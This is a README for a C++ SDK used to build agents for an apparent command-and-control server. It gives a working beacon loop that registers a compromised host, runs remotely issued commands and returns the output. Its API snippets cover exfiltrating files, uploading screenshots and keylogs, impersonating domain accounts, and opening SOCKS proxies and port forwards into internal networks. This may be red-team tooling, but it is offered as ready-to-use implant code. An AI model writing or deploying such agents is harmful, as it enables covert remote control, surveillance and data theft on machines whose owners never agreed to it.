# Hexio External Agent SDK for C++

A single-header, zero-dependency C++ client for the Hexio External Agent REST API. Works on Windows (WinHTTP) and POSIX (BSD sockets) with automatic platform detection.

## Installation

### Option 1: CMake Install (Recommended)

```bash
cd ExternalAgentSDK/cpp
cmake -B build
cmake --build build
sudo cmake --install build
```

Then in your project's `CMakeLists.txt`:

```cmake
find_package(hexio_sdk REQUIRED)
target_link_libraries(my_agent hexio::hexio_sdk)
```

### Option 2: CMake FetchContent

```cmake
include(FetchContent)
FetchContent_Declare(hexio_sdk
    GIT_REPOSITORY https://your-repo/external-agent-sdk-cpp.git
    GIT_TAG v1.0.0
)
FetchContent_MakeAvailable(hexio_sdk)
target_link_libraries(my_agent hexio::hexio_sdk)
```

### Option 3: Copy the Header

Just copy `hexio_sdk.h` into your project. On Windows, link against `winhttp.lib`.

### Cross-Compiling

The SDK works with any toolchain that supports C++17:

```bash
# Linux x64
cmake -B build -DCMAKE_CXX_COMPILER=g++

# Windows cross-compile with MinGW
cmake -B build -DCMAKE_TOOLCHAIN_FILE=mingw-w64.cmake

# macOS
cmake -B build -DCMAKE_CXX_COMPILER=clang++

# Android NDK
cmake -B build -DCMAKE_TOOLCHAIN_FILE=$NDK/build/cmake/android.toolchain.cmake -DANDROID_ABI=arm64-v8a
```

## Quick Start

```cpp
// In exactly ONE .cpp file, define the implementation macro:
#define HEXIO_SDK_IMPLEMENTATION
#include "hexio_sdk.h"

// In all other files, just include normally:
// #include "hexio_sdk.h"

int main() {
    hexio::HexioClient client("http://10.0.0.1:9000", "my-passphrase");

    // Register
    auto reg = client.registerAgent({
        .hostname = "TARGET-PC",
        .ip = "10.0.0.50",
        .user = "admin",
        .os = "Windows 10",
        .process = "agent.exe",
        .pid = 4832,
        .client_type = "my_cpp_agent",
        .sleep_time = 5
    });
    // client.token is now set automatically

    // Main beacon loop
    while (true) {
        auto checkin = client.checkinAgent();

        for (auto& cmd : checkin.commands) {
            std::string output = executeCommand(cmd.command);
            client.commandResponse(cmd.id, cmd.command, output);
        }

        #ifdef _WIN32
        Sleep(5000);
        #else
        sleep(5);
        #endif
    }
}
```

## API Reference

### Client Creation

```cpp
hexio::HexioClient client(baseUrl, passphrase);
```

### Registration

```cpp
auto resp = client.registerAgent({
    .hostname = "PC-01",
    .ip = "10.0.0.50",
    .user = "admin",
    .os = "Windows 10",
    .process = "agent.exe",
    .pid = 1234,
    .client_type = "my_agent",
    .sleep_time = 5
});
// resp.agent_id, resp.token
// client.token set automatically
```

### Checkin / Sync

```cpp
auto checkin = client.checkinAgent();
// checkin.commands is a std::vector<CommandEntry>
// checkin.rawJson has the full response

auto synced = client.sync(10, 3);  // sleep=10, jitter=3
auto synced = client.sync();       // no sleep update
```

### Command Response

```cpp
client.commandResponse(42, "whoami", "nt authority\\system");
```

### File Downloads

```cpp
auto init = client.downloadInit("data.db", "/tmp/data.db", fileSize, chunkSize, totalChunks);
auto status = client.downloadChunk(init.download_id, base64ChunkData);
client.downloadCancel(downloadId);
```

### Screenshots and Keylogs

```cpp
client.screenshot("screen.png", base64ImageData);
client.keylog("keys.txt", keystrokeData);
```

### Impersonation

```cpp
client.setImpersonation("DOMAIN\\Admin");
client.clearImpersonation();
```

### Side Channels

```cpp
client.sidechannel("shell-session-1", base64Output);
```

### File Requests

```cpp
// Build the JSON manually for file requests
hexio::json::Object req;
hexio::json::Array bofs;
bofs.add("whoami.o");
req.addRaw("bof_files", bofs.build());
auto resp = client.requestFiles(req.build());
// resp is raw JSON string
```

### SOCKS Proxy

```cpp
int64_t port = client.socksOpen();       // auto-assign
int64_t port = client.socksOpen(1080);   // specific port
client.socksClose();
auto data = client.socksSync(jsonPayload);
```

### Port Forwarding

```cpp
client.portfwdOpen(8080, "10.0.0.5", 3389);
client.portfwdClose(8080);
auto data = client.portfwdSync(jsonPayload);
```

## Platform Notes

### Windows

- Uses WinHTTP for HTTP requests
- Automatically links `winhttp.lib` via CMake
- If compiling manually: `cl /std:c++17 agent.cpp /link winhttp.lib`

### Linux / macOS / POSIX

- Uses raw BSD sockets for HTTP requests
- No external library dependencies
- Compile with: `g++ -std=c++17 -o agent agent.cpp`

### HTTPS Support

- **Windows:** WinHTTP handles TLS natively
- **POSIX:** The built-in socket transport does not support TLS. For HTTPS on POSIX, either:
  - Use a reverse proxy / tunnel that terminates TLS
  - Replace `httpRequest()` with a libcurl-based implementation

## Error Handling

All methods throw `std::runtime_error` on failure:

```cpp
try {
    client.registerAgent({...});
} catch (const std::runtime_error& e) {
    std::cerr << "Error: " << e.what() << std::endl;
}
```

## Header-Only Pattern

The SDK uses the single-header pattern. In exactly **one** `.cpp` file, define the implementation macro before including:

```cpp
#define HEXIO_SDK_IMPLEMENTATION
#include "hexio_sdk.h"
```

In all other files, include without the macro:

```cpp
#include "hexio_sdk.h"
```

This ensures the implementation is compiled once and linked everywhere.
